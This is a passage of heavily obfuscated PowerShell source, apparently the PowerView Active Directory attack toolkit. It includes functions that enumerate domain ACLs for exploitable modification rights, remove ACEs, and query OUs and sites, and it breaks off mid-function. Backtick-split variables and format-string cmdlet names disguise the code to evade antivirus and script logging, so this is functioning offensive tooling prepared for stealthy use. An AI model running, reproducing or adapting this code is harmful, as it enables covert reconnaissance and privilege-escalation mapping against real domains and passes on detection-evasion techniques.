                        &("{2}{0}{1}"-f '-Ve','rbose','Write') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        ${T`ARg`eT`entry} = ${TarGeT`Obj`ECt}.GetDirectoryEntry()
                        ${TargET`e`NTRy}.PsBase.Options.SecurityMasks = 'Dacl'
                        ${t`ARG`etEn`TRY}.PsBase.ObjectSecurity.RemoveAccessRule(${a`ce})
                        ${t`Arg`ETen`TrY}.PsBase.CommitChanges()
                    }
                }
                catch {
                    &("{3}{0}{2}{4}{1}" -f'ite-Ve','e','rbo','Wr','s') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function fi`N`d-I`N`TERESTingdomaInaCL {
<#
.SYNOPSIS

Finds object ACLs in the current (or specified) domain with modification
rights set to non-built in objects.

Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectAcl, Get-DomainObject, Convert-ADName  

.DESCRIPTION

This function enumerates the ACLs for every object in the domain with Get-DomainObjectAcl,
and for each returned ACE entry it checks if principal security identifier
is *-1000 (meaning the account is not built in), and also checks if the rights for
the ACE mean the object can be modified by the principal. If these conditions are met,
then the security identifier SID is translated, the domain object is retrieved, and
additional IdentityReference* information is appended to the output object.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-InterestingDomainAcl

Finds interesting object ACLS in the current domain.

.EXAMPLE

Find-InterestingDomainAcl -Domain dev.testlab.local -ResolveGUIDs

Finds interesting object ACLS in the ev.testlab.local domain and
resolves rights GUIDs to display names.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingDomainAcl -Credential $Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [Alias('DomainName', 'Name')]
        [String]
        ${DoM`A`iN},

        [Switch]
        ${R`e`SOl`VEGUids},

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        ${R`i`GhT`sFilTER},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lD`A`PF`iltEr},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`e`Arc`hBaSe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SERV`Er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SeA`RCHscO`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${resULT`Pa`GE`s`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`VErtim`E`LIm`it},

        [Switch]
        ${tOm`B`stONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDe`N`TiAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${aCLA`RGUme`NtS} = @{}
        if (${p`s`BoUnDpa`R`Am`eTeRs}['ResolveGUIDs']) { ${ac`LAr`gum`EN`Ts}['ResolveGUIDs'] = ${RESOLve`GuI`ds} }
        if (${P`sBOU`N`Dp`A`RAMeTerS}['RightsFilter']) { ${A`CLa`RguMenTS}['RightsFilter'] = ${riGh`T`Sf`IltER} }
        if (${pSboundp`A`RaMetE`Rs}['LDAPFilter']) { ${aCLa`RgU`Me`NTs}['LDAPFilter'] = ${L`DA`pFi`lTeR} }
        if (${PsBO`UNd`paR`AME`T`Ers}['SearchBase']) { ${ac`largUme`NtS}['SearchBase'] = ${sEaR`Chb`Ase} }
        if (${P`Sbou`NDpA`RamEtErs}['Server']) { ${aCL`ARgU`mEnts}['Server'] = ${se`R`VeR} }
        if (${PsbO`UnD`para`m`eteRS}['SearchScope']) { ${aCLa`R`gU`mEnTs}['SearchScope'] = ${SEArc`hs`cO`pE} }
        if (${P`sBoUNd`P`ArA`mEtErS}['ResultPageSize']) { ${A`ClA`RgumEnTs}['ResultPageSize'] = ${r`Es`UL`TpAG`eSize} }
        if (${pSB`o`UNDPaRA`MeteRS}['ServerTimeLimit']) { ${Ac`L`ARGUm`eN`Ts}['ServerTimeLimit'] = ${S`erVe`RTImelim`IT} }
        if (${pSB`o`UnDpa`RAm`ETERs}['Tombstone']) { ${AclarGuM`e`N`Ts}['Tombstone'] = ${to`m`BStone} }
        if (${pS`BOu`NDPaRAm`E`TerS}['Credential']) { ${aC`L`ArGu`mEn`Ts}['Credential'] = ${CR`E`dEnTI`AL} }

        ${OB`jecTSeaRCheR`A`RgUm`e`N`TS} = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = ${tr`UE}
        }
        if (${p`SBOun`DP`AR`AMetERS}['Server']) { ${o`Bje`cTSeARc`HerAR`g`U`MenTs}['Server'] = ${sERv`Er} }
        if (${PsbOuND`paRa`M`E`TERS}['SearchScope']) { ${OBjEc`TseARC`HERA`Rgume`NTs}['SearchScope'] = ${SEa`RC`HSCOPE} }
        if (${p`S`BOunDpA`RAMEtErs}['ResultPageSize']) { ${O`Bj`EC`TsEa`RCHERaRgu`ments}['ResultPageSize'] = ${rEsul`TpAG`eSi`ze} }
        if (${PSBo`U`N`dPa`RAmeT`ERS}['ServerTimeLimit']) { ${obJeC`T`searc`HERa`R`gUMEN`Ts}['ServerTimeLimit'] = ${se`R`VE`RtIME`limIT} }
        if (${psBO`U`Nd`Pa`RA`MEteRS}['Tombstone']) { ${OBje`c`TS`ear`c`hEr`Arg`UmenTS}['Tombstone'] = ${To`Mb`sToNe} }
        if (${Ps`B`Oun`dpaR`A`mEteRS}['Credential']) { ${OB`JECTseArC`HeRA`R`guMen`TS}['Credential'] = ${C`R`eDeNT`iAL} }

        ${AdNa`MEAr`g`UME`Nts} = @{}
        if (${p`sbOUnDpARAM`ET`eRs}['Server']) { ${aDnA`M`eA`Rgum`E`Nts}['Server'] = ${seR`V`eR} }
        if (${Ps`BoUndpaR`AmE`TE`Rs}['Credential']) { ${aDn`AmeArG`Um`e`NtS}['Credential'] = ${c`RE`deNtIal} }

        # ongoing list of built-up SIDs
        ${ResOlVED`s`IdS} = @{}
    }

    PROCESS {
        if (${Ps`Boun`D`PArA`mE`Ters}['Domain']) {
            ${A`ClA`RgU`MEnTs}['Domain'] = ${d`o`mAin}
            ${aD`Name`ArgUmeNtS}['Domain'] = ${Do`MaiN}
        }

        &("{3}{1}{2}{4}{0}"-f'ectAcl','Domai','nO','Get-','bj') @ACLArguments | &("{0}{2}{1}{3}"-f 'For','e','Each-Obj','ct') {

            if ( (${_}.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or ((${_}.ActiveDirectoryRights -match 'ExtendedRight') -and (${_}.AceQualifier -match 'Allow'))) {
                # only process SIDs > 1000
                if (${_}.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${R`esO`LvE`DsidS}[${_}.SecurityIdentifier.Value]) {
                        ${IdEnTityRe`Fe`REncEn`A`ME}, ${Id`E`Nt`iTYre`FErencEd`OMaIN}, ${I`D`ENTi`TyrEfE`RENceDN}, ${iDent`It`Y`REfEReN`Cec`l`Ass} = ${R`E`SOLvE`dsidS}[${_}.SecurityIdentifier.Value]

                        ${IN`TeR`EStiN`g`ACL} = &("{2}{1}{3}{0}" -f 'ect','w','Ne','-Obj') ("{0}{1}{2}" -f'PS','O','bject')
                        ${inteR`eS`Ti`NgACl} | &("{2}{0}{1}" -f'e','mber','Add-M') ("{3}{1}{0}{2}"-f'r','oteP','operty','N') 'ObjectDN' ${_}.ObjectDN
                        ${inTer`esTIN`G`ACL} | &("{3}{0}{2}{1}" -f'-Mem','er','b','Add') ("{2}{0}{1}{3}"-f 'tePr','o','No','perty') 'AceQualifier' ${_}.AceQualifier
                        ${IN`T`erE`sTINgAcL} | &("{0}{2}{1}" -f'Add-Mem','r','be') ("{2}{3}{0}{1}"-f't','y','NoteProp','er') 'ActiveDirectoryRights' ${_}.ActiveDirectoryRights
                        if (${_}.ObjectAceType) {
                            ${iNtEr`e`st`in`GaCL} | &("{2}{0}{1}" -f 'emb','er','Add-M') ("{3}{2}{0}{1}" -f 't','y','roper','NoteP') 'ObjectAceType' ${_}.ObjectAceType
                        }
                        else {
                            ${INtERe`sTI`NgaCl} | &("{1}{2}{0}" -f 'er','Ad','d-Memb') ("{2}{0}{1}" -f't','eProperty','No') 'ObjectAceType' 'None'
                        }
                        ${INt`eR`esTingacl} | &("{0}{1}{2}"-f'Add-Me','mbe','r') ("{0}{1}{2}" -f 'NotePro','per','ty') 'AceFlags' ${_}.AceFlags
                        ${in`TE`RES`TInGa`CL} | &("{2}{1}{0}"-f'r','d-Membe','Ad') ("{0}{2}{3}{1}" -f 'N','ty','ote','Proper') 'AceType' ${_}.AceType
                        ${i`N`TEResTIn`g`Acl} | &("{0}{1}{2}" -f 'Add-Memb','e','r') ("{2}{3}{1}{0}"-f'operty','r','N','oteP') 'InheritanceFlags' ${_}.InheritanceFlags
                        ${iNTEReST`I`NGA`cl} | &("{0}{2}{1}" -f'Add-','r','Membe') ("{2}{1}{0}"-f 'erty','teProp','No') 'SecurityIdentifier' ${_}.SecurityIdentifier
                        ${int`EresTinG`ACL} | &("{2}{1}{0}"-f'ber','dd-Mem','A') ("{2}{3}{1}{0}"-f'perty','tePro','N','o') 'IdentityReferenceName' ${iDeNT`i`TyrE`F`Ere`NcE`Name}
                        ${inTere`StIng`A`Cl} | &("{2}{3}{0}{1}" -f 'emb','er','Ad','d-M') ("{3}{1}{2}{0}" -f 'y','o','pert','NotePr') 'IdentityReferenceDomain' ${iDentiT`yre`Fe`ReNCE`DOMA`In}
                        ${IN`TEr`e`S`TIngacl} | &("{1}{0}{2}"-f'Membe','Add-','r') ("{1}{0}{2}"-f 'per','NotePro','ty') 'IdentityReferenceDN' ${IDEnt`i`TYr`eFeRE`NcEdn}
                        ${i`NTEreS`T`ingACl} | &("{1}{3}{2}{0}" -f'mber','Ad','Me','d-') ("{1}{0}{2}" -f 'teP','No','roperty') 'IdentityReferenceClass' ${I`dE`NTIt`YRE`FeR`en`CeCLaSs}
                        ${inTe`R`esTI`NgACL}
                    }
                    else {
                        ${Ide`Nti`TY`REFere`NcedN} = &("{1}{0}{3}{2}"-f 'r','Conve','DName','t-A') -Identity ${_}.SecurityIdentifier.Value -OutputType ('DN') @ADNameArguments
                        # "IdentityReferenceDN: $IdentityReferenceDN"

                        if (${i`DENtI`T`Y`ReFERenCEdn}) {
                            ${IdENTi`Ty`REfEReNCeD`oM`A`in} = ${idE`N`TItyREf`ErEnc`edN}.SubString(${id`eNt`I`T`Yr`eFEren`CeDN}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            # "IdentityReferenceDomain: $IdentityReferenceDomain"
                            ${OB`J`eCtse`A`RCh`erArGUmEnts}['Domain'] = ${iDENtIt`yREf`ere`N`CeD`O`MAIn}
                            ${o`B`JEcTs`EArCHERArgU`M`E`N`TS}['Identity'] = ${IdE`N`Tity`Ref`eR`eNCEdn}
                            # "IdentityReferenceDN: $IdentityReferenceDN"
                            ${O`BJ`Ect} = &("{1}{3}{2}{4}{0}"-f 'ct','Get-','ain','Dom','Obje') @ObjectSearcherArguments

                            if (${OB`jecT}) {
                                ${idEnTI`TY`ReFe`REncEn`AmE} = ${OBJ`ecT}.Properties.samaccountname[0]
                                if (${oBj`E`CT}.Properties.objectclass -match 'computer') {
                                    ${i`dent`iTYrE`FERE`NceCLaSS} = 'computer'
                                }
                                elseif (${Ob`J`eCT}.Properties.objectclass -match 'group') {
                                    ${iDeN`Ti`TYrefeR`eNCe`CLasS} = 'group'
                                }
                                elseif (${oBJ`E`ct}.Properties.objectclass -match 'user') {
                                    ${idENTi`TY`ReF`e`REnce`CLA`SS} = 'user'
                                }
                                else {
                                    ${IDentiT`yR`EFERENce`CLa`sS} = ${N`ULl}
                                }

                                # save so we don't look up more than once
                                ${reSOl`VE`DsiDS}[${_}.SecurityIdentifier.Value] = ${iD`E`NtiT`yrE`FEReN`ce`NaMe}, ${idEnTityRef`eR`e`N`ce`doMaiN}, ${Id`EnTItyre`FeR`ENC`e`dn}, ${I`DE`NtITyRE`FeRENCEcl`Ass}

                                ${in`T`ErESTinga`cL} = &("{1}{3}{0}{2}"-f'w-Obj','N','ect','e') ("{0}{1}{2}" -f'PSO','b','ject')
                                ${Int`EReS`TingacL} | &("{0}{2}{1}" -f'Add-','ber','Mem') ("{0}{1}{2}" -f 'N','oteProper','ty') 'ObjectDN' ${_}.ObjectDN
                                ${inteR`EstING`Acl} | &("{3}{0}{1}{2}"-f'dd-Me','mb','er','A') ("{2}{3}{1}{0}"-f 'erty','p','NoteP','ro') 'AceQualifier' ${_}.AceQualifier
                                ${INTeR`e`s`TINg`ACl} | &("{0}{2}{1}"-f'A','ember','dd-M') ("{2}{0}{3}{1}"-f'o','rty','N','tePrope') 'ActiveDirectoryRights' ${_}.ActiveDirectoryRights
                                if (${_}.ObjectAceType) {
                                    ${iN`Te`RES`T`Ingacl} | &("{2}{1}{0}" -f 'Member','dd-','A') ("{1}{0}{2}{3}" -f 'te','No','P','roperty') 'ObjectAceType' ${_}.ObjectAceType
                                }
                                else {
                                    ${IN`TeR`e`ST`ingACl} | &("{0}{1}{2}"-f'Add-','Me','mber') ("{3}{1}{2}{0}"-f 'erty','oteP','rop','N') 'ObjectAceType' 'None'
                                }
                                ${In`Ter`eSTiNG`Acl} | &("{0}{1}{2}"-f 'Ad','d','-Member') ("{1}{2}{0}"-f'rty','NoteP','rope') 'AceFlags' ${_}.AceFlags
                                ${INt`e`ReStiNg`ACl} | &("{1}{0}{2}"-f'Membe','Add-','r') ("{1}{3}{2}{0}" -f 'erty','Not','p','ePro') 'AceType' ${_}.AceType
                                ${i`N`TEreSt`iNGACl} | &("{1}{3}{0}{2}"-f 'be','Add-Me','r','m') ("{3}{2}{1}{0}" -f'eProperty','t','o','N') 'InheritanceFlags' ${_}.InheritanceFlags
                                ${iNtER`e`S`T`iNgacL} | &("{3}{2}{0}{1}"-f 'be','r','em','Add-M') ("{2}{0}{1}"-f'Prope','rty','Note') 'SecurityIdentifier' ${_}.SecurityIdentifier
                                ${iN`TER`e`stINgACL} | &("{0}{1}{3}{2}"-f 'Add-M','emb','r','e') ("{3}{0}{1}{2}"-f'o','tePropert','y','N') 'IdentityReferenceName' ${IDe`NT`itY`R`EF`eReNCEn`AmE}
                                ${I`NT`EREstiNGa`cl} | &("{3}{2}{0}{1}"-f 'm','ber','Me','Add-') ("{3}{1}{2}{0}"-f 'rty','Pro','pe','Note') 'IdentityReferenceDomain' ${i`dENTiTYreF`ereN`c`e`d`oM`AIN}
                                ${INt`eR`esTing`AcL} | &("{1}{2}{0}{3}" -f 'b','Ad','d-Mem','er') ("{0}{1}{2}{3}"-f'N','otePro','pert','y') 'IdentityReferenceDN' ${IdeNTiTyRe`F`Eren`ce`dn}
                                ${iNTE`RE`STINGAcl} | &("{0}{1}{2}" -f 'Add-','Memb','er') ("{2}{1}{0}"-f'perty','o','NotePr') 'IdentityReferenceClass' ${IDeNTItYReF`e`Re`NcEclA`ss}
                                ${i`Nte`R`ES`TInGAcl}
                            }
                        }
                        else {
                            &("{1}{0}{2}" -f 'nin','Write-War','g') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function Get-doma`I`NoU {
<#
.SYNOPSIS

Search for all organization units (OUs) or specific OU objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all OU objects for
the current domain are returned.

.PARAMETER Identity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted.

.PARAMETER GPLink

Only return OUs with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainOU

Returns the current OUs in the domain.

.EXAMPLE

Get-DomainOU *admin* -Domain testlab.local

Returns all OUs with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainOU -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all OUs with linked to the specified group policy object.

.EXAMPLE

"*admin*","*server*" | Get-DomainOU

Search for OUs with the specific names.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainOU -Credential $Cred

.OUTPUTS

PowerView.OU

Custom PSObject with translated OU property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${TR`UE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('Name')]
        [String[]]
        ${ID`eNT`iTy},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${g`P`LINK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`main},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${l`DAP`Fil`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prOp`E`RTIES},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`earCHB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`R`VeR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`e`ArCHSCO`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`sULTpaG`esi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ErV`ERt`ImEL`iMit},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${seC`URiT`yma`sks},

        [Switch]
        ${T`OmbSt`onE},

        [Alias('ReturnOne')]
        [Switch]
        ${F`I`Ndone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrED`E`NtI`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${S`E`ARcHerA`R`GumeNtS} = @{}
        if (${PSbo`U`N`d`paRAMET`eRS}['Domain']) { ${Se`Arc`HERa`RguMENTS}['Domain'] = ${d`oMaIN} }
        if (${pSB`OU`NDpARAME`TeRs}['Properties']) { ${sEarchErARG`U`m`En`Ts}['Properties'] = ${P`RO`per`TIes} }
        if (${pSbOunDPA`RAM`Et`Ers}['SearchBase']) { ${Se`ARChe`Ra`RguMEntS}['SearchBase'] = ${sEa`Rch`B`ASe} }
        if (${P`sbO`UNDpARA`me`TERS}['Server']) { ${SE`ARC`HE`RArgUmeNTs}['Server'] = ${Se`RV`eR} }
        if (${psBo`U`NdPaR`A`mETe`Rs}['SearchScope']) { ${seAr`CHER`Ar`gUM`eNts}['SearchScope'] = ${seA`RcHS`COPe} }
        if (${psBoUNDP`Ar`AME`Ters}['ResultPageSize']) { ${SE`Arch`ERaRgUMe`N`TS}['ResultPageSize'] = ${rE`sUltPa`G`ESiZe} }
        if (${psBOuND`pAr`A`metERs}['ServerTimeLimit']) { ${sEArC`H`ERarg`UmeN`Ts}['ServerTimeLimit'] = ${Se`R`VertimE`lI`mIt} }
        if (${pSBo`UN`d`pA`RAmeTErs}['SecurityMasks']) { ${s`EAR`CH`ErARGUm`ENTs}['SecurityMasks'] = ${s`ecuri`TymaSKS} }
        if (${p`s`BoundPArAm`ETeRS}['Tombstone']) { ${SEa`RcHe`RAR`gUmE`Nts}['Tombstone'] = ${T`O`M`BsTONe} }
        if (${ps`BOUnd`Pa`RaMeteRs}['Credential']) { ${S`ear`Ch`ERa`RguMenTS}['Credential'] = ${cR`e`D`eNtiAl} }
        ${Ouse`Ar`c`Her} = &("{1}{3}{5}{2}{0}{4}"-f 'nSearc','Get-','mai','D','her','o') @SearcherArguments
    }

    PROCESS {
        if (${oUSEAR`CH`er}) {
            ${iDeN`TI`Ty`FILTER} = ''
            ${fiLt`eR} = ''
            ${i`d`eNTI`TY} | &("{3}{0}{1}{2}"-f'-','O','bject','Where') {${_}} | &("{1}{2}{3}{0}" -f 'ct','For','Each-Ob','je') {
                ${Id`E`NtI`TY`INS`TaNcE} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${i`d`eNtItYIns`TanCE} -match '^OU=.*') {
                    ${I`DEnt`iTYFiLt`ER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${ps`Bound`P`ArAm`E`TerS}['Domain']) -and (-not ${PsBo`UNdp`Ar`AMe`TErS}['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        ${ID`eNtiT`yd`OM`AIn} = ${Iden`TiTyI`N`StancE}.SubString(${iDE`NTITY`InsT`ANce}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{1}{3}{0}"-f'bose','e-Ve','Writ','r') "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${Se`ARch`eRArGU`ME`NtS}['Domain'] = ${id`En`TIt`YdOmAin}
                        ${OU`S`eaRCH`eR} = &("{1}{0}{2}{3}{4}" -f'et','G','-D','oma','inSearcher') @SearcherArguments
                        if (-not ${OU`sEA`RCH`ER}) {
                            &("{0}{1}{2}" -f'Writ','e-Warnin','g') "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        ${G`UiDB`yTe`StRing} = (-Join (([Guid]${IdentiTyIn`S`T`A`Nce}).ToByteArray() | &("{2}{1}{0}{3}{4}"-f 'ach-','rE','Fo','Obj','ect') {${_}.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        ${iDEN`TiTyfI`L`TEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${ideNT`ITyF`il`T`eR} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${idE`N`Tity`FiltEr} -and (${iDENtIt`YfIL`TEr}.Trim() -ne '') ) {
                ${FI`Lt`ER} += "(|$IdentityFilter)"
            }

            if (${psbOU`N`dPa`Ram`ETeRs}['GPLink']) {
                &("{0}{2}{1}{3}" -f'Write','rbo','-Ve','se') "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                ${fIlt`ER} += "(gplink=*$GPLink*)"
            }

            if (${psb`OuNdpA`RaME`TerS}['LDAPFilter']) {
                &("{2}{1}{3}{0}{4}"-f'b','e-V','Writ','er','ose') "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                ${fiLT`ER} += "$LDAPFilter"
            }

            ${oU`S`EaRCheR}.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            &("{0}{3}{4}{2}{1}" -f 'Wr','e','s','it','e-Verbo') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if (${PsbOunDpAr`A`mete`RS}['FindOne']) { ${RES`U`LTs} = ${o`UseaR`cHer}.FindOne() }
            else { ${RE`Su`lTs} = ${Ou`sEArc`HeR}.FindAll() }
            ${RESu`l`TS} | &("{1}{2}{0}{3}"-f'er','W','h','e-Object') {${_}} | &("{4}{0}{2}{1}{3}" -f 'E','ch-O','a','bject','For') {
                if (${PsbOuNDP`A`RAmetE`Rs}['Raw']) {
                    # return raw result objects
                    ${o`U} = ${_}
                }
                else {
                    ${Ou} = &("{0}{2}{3}{1}"-f 'Conver','operty','t-LD','APPr') -Properties ${_}.Properties
                }
                ${OU}.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                ${o`U}
            }
            if (${reS`U`Lts}) {
                try { ${ReSu`L`Ts}.dispose() }
                catch {
                    &("{0}{3}{2}{1}"-f 'Write-V','se','rbo','e') "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            ${oU`seA`RcHER}.dispose()
        }
    }
}


function G`Et`-do`mA`insIte {
<#
.SYNOPSIS

Search for all sites or specific site objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all site objects for
the current domain are returned.

.PARAMETER Identity

An site name (e.g. Test-Site), DistinguishedName (e.g. CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), or
GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER GPLink

Only return sites with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSite

Returns the current sites in the domain.

.EXAMPLE

Get-DomainSite *admin* -Domain testlab.local

Returns all sites with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSite -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all sites with linked to the specified group policy object.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSite -Credential $Cred

.OUTPUTS

PowerView.Site

Custom PSObject with translated site property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${TR`Ue}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('Name')]
        [String[]]
        ${iD`EN`TIty},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${GP`LI`NK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`maIN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${l`dA`PfiLter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`RO`pErt`iEs},

        [ValidateNotNullOrEmpty()]
